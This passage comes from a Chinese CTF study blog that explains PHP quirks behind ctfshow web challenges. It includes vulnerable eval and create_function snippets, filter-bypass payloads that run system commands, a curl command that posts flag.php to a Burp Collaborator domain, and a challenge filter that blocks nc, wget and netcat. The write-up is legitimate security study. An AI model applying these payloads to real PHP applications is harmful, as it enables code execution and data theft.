alt=\"image-20240514183501813\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"string\">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">// 推荐用法</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$str</span>, <span class=\"variable\">$output</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$output</span>[<span class=\"string\">&#x27;first&#x27;</span>];  <span class=\"comment\">// value</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$output</span>[<span class=\"string\">&#x27;arr&#x27;</span>][<span class=\"number\">0</span>]; <span class=\"comment\">// foo bar</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$output</span>[<span class=\"string\">&#x27;arr&#x27;</span>][<span class=\"number\">1</span>]; <span class=\"comment\">// baz</span></span><br></pre></td></tr></table></figure>\n\n<p>‘<a href=\"https://www.php.net/manual/zh/reserved.variables.argv.php\">argv</a>‘</p>\n<p>​              传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string</p>\n<p><strong>命令行模式下</strong>：<code>$_SERVER[&#39;argv&#39;][0]</code>是脚本名，其他的是传递给脚本的参数。<br> <strong>网页模式下</strong>：需要php.ini开启register_argc_argv配置</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240514185729248.png\" alt=\"image-20240514185729248\"></p>\n<p><code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;];</code>$_SERVER[‘argv’][0] 是$_SERVER[‘QUERY_STRING’];，$_SERVER[‘argv’][1] 的传递方式就和命令行类似了，空格，然后传递第二个参数，以此类推。利用$_SERVER[‘argv’][1] 就可以绕过对isset($fl0g)的判断。用+代表空格</p>\n<p>最终payload</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240514185903980.png\" alt=\"image-20240514185903980\"></p>\n<p>下图可以看到</p>\n<p><code>$_SERVER[argv][0]</code>等同于$_SERVER[QUARY_STRING]</p>\n<p>通过本地实验可得 <strong>url直接输入字符</strong>就是<code>$_SERVER[&#39;argv&#39;][0] </code>是输入的字符串，所以可以利用来执行php语句。</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240514190837251.png\" alt=\"image-20240514190837251\"></p>\n<p>最终payload </p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240514191335029.png\" alt=\"image-20240514191335029\"></p>\n<h2 id=\"22-extract构造新变量\"><a href=\"#22-extract构造新变量\" class=\"headerlink\" title=\"22.extract构造新变量\"></a>22.extract构造新变量</h2><p>web127</p>\n<p>当看见</p>\n<p>extract($_GET)时</p>\n<p>即可直接构造并引入新变量</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$ctf_show</span>===<span class=\"string\">&#x27;ilove36d&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>就直接可以传入</p>\n<p>GET:<strong>url?ctf_show&#x3D;ilove36d</strong></p>\n<p>即使<strong>先前已存在$ctf_show也会覆盖掉</strong></p>\n<p>最终payload：</p>\n<p>GET:<strong>url?ctf show&#x3D;ilove36d</strong>  下划线用空格或+替代即可</p>\n<h2 id=\"23-别名gettext-函数\"><a href=\"#23-别名gettext-函数\" class=\"headerlink\" title=\"23._()  别名gettext() 函数\"></a>23._()  别名gettext() 函数</h2><p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240514194442426.png\" alt=\"image-20240514194442426\"></p>\n<p>对<strong>f1</strong>进行无字母数字过滤</p>\n<p>所以var_dump var_export都用不了</p>\n<p>可以想到gettext() <strong>可以将参数翻译成指定语言，一般就是原封不动的输出参数</strong></p>\n<p>别名_()可以传入</p>\n<p>最终payload:</p>\n<p><strong>?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</strong>    call_user_func传入参数时仅需<strong>传入参数名称即可</strong></p>\n<h2 id=\"24-stripos函数绕过\"><a href=\"#24-stripos函数绕过\" class=\"headerlink\" title=\"24.stripos函数绕过\"></a>24.stripos函数绕过</h2><h3 id=\"web130\"><a href=\"#web130\" class=\"headerlink\" title=\"web130\"></a>web130</h3><p>查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>\n<p>返回布尔值，未找到返回0（false）,找到返回1（true）</p>\n<p>采用<code>数组</code>绕过的方法，<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p>\n<h2 id=\"25-substr截取绕过-数据外带\"><a href=\"#25-substr截取绕过-数据外带\" class=\"headerlink\" title=\"25.substr截取绕过&amp;数据外带\"></a>25.substr截取绕过&amp;数据外带</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$F</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;F&#x27;</span>])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class=\"variable\">$F</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$F</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>));</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>GET传入<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240515215123087.png\" alt=\"image-20240515215123087\"></p>\n<p>1.传入的是$F本身</p>\n<p>2.返回的是<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240515215107026.png\" alt=\"image-20240515215107026\">6个字符 有一个空格</p>\n<p>3.所以返回后eval中本质是eval(<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240515215107026.png\" alt=\"image-20240515215107026\">)</p>\n<p>4.因为$F &#x3D; <code>@$_GET[&#39;F&#39;]</code>，<code>$_GET[&#39;F&#39;]</code>内容为<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240515215123087.png\" alt=\"image-20240515215123087\"></p>\n<p>5.即eval(<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240515215123087.png\" alt=\"image-20240515215123087\">) </p>\n<p>6.发现执行后网页加载三秒，即可构造命令执行</p>\n<p>7.发现touch 1；命令无效，转为数据外带</p>\n<p>利用burp的<strong>Collaborator Client</strong> 类似dnslog 但更强大</p>\n<p>payload：</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240516154425392.png\" alt=\"image-20240516154425392\"></p>\n<p>curl -X POST -F xx&#x3D;@flag.php</p>\n<p><code>-X POST</code> 指定了请求的方法为 POST</p>\n<p><code>-F xx=@flag.php</code> 则表示向请求中添加一个名为 <code>xx</code> 的表单字段，并将文件 <code>flag.php</code> 的内容作为该字段的值</p>\n<p>这个命令的作用是将 <code>flag.php</code> 文件的内容作为一个表单字段发送到指定的目标地址</p>\n<p>目标地址即是burp的<strong>Collaborator Client</strong>中获取到域名</p>\n<p>获取后执行会得到回显</p>\n<p>即数据外带成功</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240516154706647.png\" alt=\"image-20240516154706647\"></p>\n<h2 id=\"26-SERVER-QUARY-STRING-和parse-str的妙用\"><a href=\"#26-SERVER-QUARY-STRING-和parse-str的妙用\" class=\"headerlink\" title=\"26.$_SERVER[QUARY_STRING]和parse_str的妙用\"></a>26.$_SERVER[QUARY_STRING]和parse_str的妙用</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$F</span> = @<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;F&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&#x27;aaaaaaa&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$F</span>);</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;QUERY_STRING&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240516160907844.png\" alt=\"image-20240516160907844\"></p>\n<p>查看发现GET传参中a已被parse_str函数解析成变量</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240516161202674.png\" alt=\"image-20240516161202674\"></p>\n<h3 id=\"web134\"><a href=\"#web134\" class=\"headerlink\" title=\"web134\"></a>web134</h3><p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240516161230202.png\" alt=\"image-20240516161230202\"></p>\n<p>我们就可以在GET传</p>\n<p><code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p>\n<p>1.绕过第一个if</p>\n<p>2.将_POST[key1]解析成<code>$_POST[]</code></p>\n<p>3.符合第二个if判断</p>\n<h2 id=\"27-ls-112-和-ls-tee-114\"><a href=\"#27-ls-112-和-ls-tee-114\" class=\"headerlink\" title=\"27.ls &gt; 112 和 ls |tee 114\"></a>27.ls &gt; 112 和 ls |tee 114</h2><p><strong>命令执行回显输入到文件</strong></p>\n<p><strong>1.</strong><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240517160514532.png\" alt=\"image-20240517160514532\"><strong>2.</strong><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240517160604312.png\" alt=\"image-20240517160604312\"></p>\n<h3 id=\"web136\"><a href=\"#web136\" class=\"headerlink\" title=\"web136\"></a>web136</h3><p>第一种方法被ban掉</p>\n<p>payload:</p>\n<p>GET:  <strong>?c&#x3D;cat &#x2F;f149_15_h3r3 | tee 1</strong></p>\n<p>访问url&#x2F;1之后会<strong>下载文件</strong>，<strong>文件内容即是回显</strong></p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240517160935883.png\" alt=\"image-20240517160935883\"></p>\n<h2 id=\"28-通过call-user-func-调用类中方法\"><a href=\"#28-通过call-user-func-调用类中方法\" class=\"headerlink\" title=\"28.通过call_user_func()调用类中方法\"></a>28.通过call_user_func()调用类中方法</h2><h3 id=\"web137\"><a href=\"#web137\" class=\"headerlink\" title=\"web137\"></a>web137</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfshow</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;private class&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFlag</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<p>1.POST:<strong>ctfshow&#x3D;ctfshow::getFlag</strong>  等同于  <strong>call_user_func(ctfshow .’::getFlag’);</strong></p>\n<p>2.POST:**ctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag **等同于 <strong>call_user_func(array(ctfshow, ‘getFlag’));</strong></p>\n<h2 id=\"29-弱类型比较\"><a href=\"#29-弱类型比较\" class=\"headerlink\" title=\"29.弱类型比较\"></a>29.弱类型比较</h2><h3 id=\"web140\"><a href=\"#web140\" class=\"headerlink\" title=\"web140\"></a>web140</h3><p>在PHP中，当进行<strong>弱类型比较</strong>时，如果一个字符串被转换成整数时，会根据其内容进行转换。如果字<strong>符串不能被转换为合法的整数</strong>，那么<strong>它会被转换为0。</strong></p>\n<p>eg:    <code>if(intval($code) == &#39;ctfshow&#39;)</code></p>\n<p>前者<strong>返回值为0</strong>即可<strong>通过判断</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f1=sleep&amp;f2=sleep</span><br><span class=\"line\">f1=md5&amp;f2=phpinfo</span><br><span class=\"line\">f1=md5&amp;f2=md5</span><br><span class=\"line\">f1=sha1&amp;f2=getcwd</span><br><span class=\"line\">f1=intval&amp;f2=getcwd</span><br><span class=\"line\">f1=getcwd&amp;f2=getcwd</span><br><span class=\"line\">f1=exec&amp;f2=exec</span><br><span class=\"line\">f1=system&amp;f2=system</span><br></pre></td></tr></table></figure>\n\n<p>总之思路就是找到一个函数, 使它的<strong>返回值为空</strong>, <strong>空值 intval 之后也会变成0</strong></p>\n<h2 id=\"30-数字可以和命令进行一些运算\"><a href=\"#30-数字可以和命令进行一些运算\" class=\"headerlink\" title=\"30.数字可以和命令进行一些运算\"></a>30.数字可以和命令进行一些运算</h2><p>eg:</p>\n<p><code>&lt;?php</code><br><code>echo 1-(&#39;phpinfo&#39;)()-1;</code> <img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240521170125012.png\" alt=\"image-20240521170125012\"></p>\n<h3 id=\"web141\"><a href=\"#web141\" class=\"headerlink\" title=\"web141\"></a>web141</h3><p>加减运算</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">preg_match(&#x27;/^\\W+$/&#x27;, $str)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>^</code>：匹配输入字符串的开头</li>\n<li><code>\\W</code>：匹配任何非单词字符（[^a-zA-Z0-9_]）</li>\n<li><code>+</code>：匹配前面的模式一次或多次</li>\n<li><code>$</code>：匹配输入字符串的结尾</li>\n</ul>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240521170946192.png\" alt=\"image-20240521170946192\"></p>\n<p>payload:<br>v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-(“%08%02%08%08%05%0d”^”%7b%7b%7b%7c%60%60”)(“%03%01%08%00%06%0c%01%07%00%0b%08%0b”^”%60%60%7c%20%60%60%60%60%2e%7b%60%7b”);</p>\n<h3 id=\"web145\"><a href=\"#web145\" class=\"headerlink\" title=\"web145\"></a>web145</h3><p>三目运算   a|b|c</p>\n<p>payload:</p>\n<p>v1&#x3D;1&amp;v3&#x3D;|(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%99%D5)|&amp;v2&#x3D;1</p>\n<p>v1&#x3D;1&amp;v3&#x3D;?(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%99%D5):&amp;v2&#x3D;1</p>\n<h2 id=\"31-php命名空间-create-function函数注入\"><a href=\"#31-php命名空间-create-function函数注入\" class=\"headerlink\" title=\"31.php命名空间  &amp;  create_function函数注入\"></a>31.php命名空间  &amp;  create_function函数注入</h2><h2 id=\"命名空间使用\"><a href=\"#命名空间使用\" class=\"headerlink\" title=\"命名空间使用\"></a>命名空间使用</h2><p>PHP 命名空间中的类名可以通过三种方式引用：</p>\n<ol>\n<li><p><strong>非限定名称，或不包含前缀的类名称，</strong>例如 $a&#x3D;new foo(); 或  foo::staticmethod();。如果当前命名空间是 currentnamespace，foo 将被解析为  currentnamespace\\foo。如果使用 foo 的代码是全局的，不包含在任何命名空间中的代码，则 foo 会被解析为foo。  警告：如果命名空间中的函数或常量未定义，则该非限定的函数名称或常量名称会被解析为全局函数名称或常量名称。</p>\n</li>\n<li><p><strong>限定名称,或包含前缀的名称，</strong>例如 $a &#x3D; new  subnamespace\\foo(); 或 subnamespace\\foo::staticmethod();。如果当前的命名空间是  currentnamespace，则 foo 会被解析为 currentnamespace\\subnamespace\\foo。如果使用 foo  的代码是全局的，不包含在任何命名空间中的代码，foo 会被解析为subnamespace\\foo。</p>\n</li>\n<li><p><strong>完全限定名称，或包含了全局前缀操作符的名称，</strong>例如， $a &#x3D; new  \\currentnamespace\\foo(); 或  \\currentnamespace\\foo::staticmethod();。在这种情况下，foo 总是被解析为代码中的文字名(literal  name)currentnamespace\\foo。</p>\n</li>\n</ol>\n<p>我们常使用的是<strong>第三个 完全限定名称</strong></p>\n<p>​\t联系上文，如果我们要调用php中的函数，就可以</p>\n<p>​\t<strong>\\create_function</strong> （输入函数名即可）</p>\n<p>​\t这样写发是因为 \\ 后的变量是调用  \\  这个命名空间下的</p>\n<p>​\t同理，调用\\这个命名空间下的函数，即\\create_function</p>\n<h2 id=\"create-function函数注入\"><a href=\"#create-function函数注入\" class=\"headerlink\" title=\"create_function函数注入\"></a>create_function函数注入</h2><p><strong>create_function  匿名函数动态创建函数</strong></p>\n<p>eg:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$q</span> = <span class=\"string\">&#x27;echo&#x27;</span>.<span class=\"variable\">$id</span>.<span class=\"string\">&#x27;is&#x27;</span>.<span class=\"variable\">$a</span>.<span class=\"string\">&quot;;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$sy</span> = <span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"variable\">$q</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这段代码等价于</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">niming</span>(<span class=\"params\"><span class=\"variable\">$a</span></span>)</span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">echo</span> <span class=\"variable\">$id</span>.<span class=\"string\">&#x27;is&#x27;</span>.<span class=\"variable\">$a</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>前者中的q就相当于函数体</p>\n<p>我们第二段代码本地实验发现可以闭合函数体，进行命令执行 <strong>（create_function函数是调用了eval）</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost/create_function.php?id=1;&#125;phpinfo();/*</span><br><span class=\"line\"></span><br><span class=\"line\">;&#125; 闭合原来函数体</span><br><span class=\"line\">/*  闭合后会多出来一个 / ，需将其注释掉</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240526153637159.png\" alt=\"image-20240526153637159\"></p>\n<p>发现php探针成功</p>\n<p>用第一段代码进行本地实验发现<strong>也可执行</strong></p>\n<h3 id=\"web147\"><a href=\"#web147\" class=\"headerlink\" title=\"web147\"></a>web147<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240526154002117.png\" alt=\"image-20240526154002117\"></h3><p>payload:</p>\n<p>POST: <strong>ctf&#x3D;\\create_function</strong></p>\n<p>GET: <strong>?show&#x3D;1;}system(‘cat flag.php’);&#x2F;</strong>*</p>\n","feature":true,"text":"php特性1.intval 也就是说传入是数组时，返回值为1 (弱比较) 此函数会将 + 空格来进行跳过判断 当base=0时，进制可以自定义 Web92传入其...","permalink":"/post/php特性","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":7,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#php%E7%89%B9%E6%80%A7\"><span class=\"toc-text\">php特性</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-intval\"><span class=\"toc-text\">1.intval</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web92\"><span class=\"toc-text\">Web92</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web93\"><span class=\"toc-text\">Web93</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-preg-match\"><span class=\"toc-text\">2.preg_match</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web91\"><span class=\"toc-text\">web91</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-strops\"><span class=\"toc-text\">3.strops</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-php%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6\"><span class=\"toc-text\">4.php三目运算符</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-in-array\"><span class=\"toc-text\">5.in_array</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-is-numeric\"><span class=\"toc-text\">6.is_numeric</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-and%E4%B8%8E-%E7%9A%84%E5%8C%BA%E5%88%AB-%EF%BC%88%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%89-%E5%8F%8D%E5%B0%84%E7%B1%BBReflectionClass%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">7. and与&amp;&amp;的区别 （优先级）+反射类ReflectionClass的使用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web100\"><span class=\"toc-text\">Web100</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web132\"><span class=\"toc-text\">web132</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hex2bin%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">hex2bin转换</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-ctype-alpha\"><span class=\"toc-text\">9.ctype_alpha</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96\"><span class=\"toc-text\">10.变量覆盖</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web105\"><span class=\"toc-text\">web105</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-parse-str\"><span class=\"toc-text\">11.parse_str</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web107\"><span class=\"toc-text\">web107</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-strrev-ereg\"><span class=\"toc-text\">12.strrev+ereg</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-PHP%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-Exception\"><span class=\"toc-text\">13.PHP异常处理 Exception</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web109\"><span class=\"toc-text\">web109</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">PHP原生类总结</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#14-FilesystemIterator\"><span class=\"toc-text\">14.FilesystemIterator</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web110\"><span class=\"toc-text\">web110</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#15-GLOBAL\"><span class=\"toc-text\">15.GLOBAL</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#16-is-file\"><span class=\"toc-text\">16.is_file</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#17-compress-zlib\"><span class=\"toc-text\">17.compress.zlib:&#x2F;&#x2F;</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web113\"><span class=\"toc-text\">web113</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#18-num-36-and-num-36-%E5%92%8C-trim%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">18.num!&#x3D;&#x3D;36 and num&#x3D;&#x3D;36 和 trim绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web115\"><span class=\"toc-text\">web115</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#19-php-get%E6%88%96post%E5%8F%98%E9%87%8F%E5%90%8D%E4%B8%AD%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6%E8%BD%AC%E5%8C%96%E8%A7%84%E5%88%99\"><span class=\"toc-text\">19.php get或post变量名中非法字符转化规则</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web123\"><span class=\"toc-text\">web123</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#20-var-export%E5%92%8Cinclude-GET-1-%E5%92%8Chighlight-file-GET-1\"><span class=\"toc-text\">20.var_export和include$_GET[1]和highlight_file($GET[1])</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web125\"><span class=\"toc-text\">web125</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#21-parse-str-%E5%8F%8A-SERVER-argv-%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">21.parse_str()及$_SERVER[argv]的利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web126\"><span class=\"toc-text\">web126</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#22-extract%E6%9E%84%E9%80%A0%E6%96%B0%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">22.extract构造新变量</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#23-%E5%88%AB%E5%90%8Dgettext-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">23._()  别名gettext() 函数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 